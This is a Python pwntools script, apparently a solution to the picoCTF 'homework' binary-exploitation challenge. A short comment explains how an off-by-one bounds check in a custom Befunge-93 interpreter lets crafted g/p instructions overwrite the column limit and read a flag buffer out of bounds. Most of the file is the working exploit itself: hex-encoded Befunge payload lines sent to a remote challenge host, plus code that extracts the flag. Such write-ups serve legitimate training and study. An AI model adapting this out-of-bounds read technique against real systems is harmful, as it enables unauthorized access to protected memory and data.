#!/usr/bin/env python3
# homework - picoMini by redpwn (Binary Exploitation, Hard) by tpa
# Custom Befunge-93 interpreter (board 50x22, 4 input lines of <=21 bytes).
# g/p bounds check uses globals rows/cols which live right after the board and
# are reachable via the off-by-one (<= instead of <). Write cols=200 to reach
# past the globals into the flag buffer; then loop g + ',' to print the flag.
from pwn import *

context.log_level = "info"
HOST = args.HOST or "mars.picoctf.net"
PORT = int(args.PORT or 31689)

# Build a 50 on the stack
line_1 = b"\x30\x21\x3a\x2b" + b"\x3a\x3a\x3a\x3a\x2b\x2b\x2b\x2b" * 2 + b"\x76"

# (reverse order because the IP moves left on this row)
line_2 = b"\x3c\x30\x30\x70\x30\x30\x67\x3a\x3a\x3a\x2b\x2b\x2b\x30\x30\x67\x30\x21\x3a\x2b\x76"[
    ::-1
]

# Set cols = 200 via p at (50*0x16 + 4)
line_3 = b"\x3e\x3a\x2b\x5c\x70\x30" + b"\x3e" * 14 + b"\x76"

# Loop: g flag byte and output it with ','
line_4 = (b"\x3c\x3a\x30\x30\x67\x67\x2c" + b"\x30\x21\x2b" + b"\x3c" * 11)[::-1]


def main():
    r = remote(HOST, PORT)
    r.recvuntil(b"sol", timeout=5)
    r.sendline(line_1)
    r.sendline(line_2)
    r.sendline(line_3)
    r.sendline(line_4)
    try:
        data = r.recvrepeat(3)
    except EOFError:
        data = b""
    print(data.decode(errors="replace"))
    m = re.search(rb"picoCTF\{[^}]+\}", data)
    if m:
        print("\n[+] FLAG:", m.group(0).decode())
    r.close()


if __name__ == "__main__":
    main()
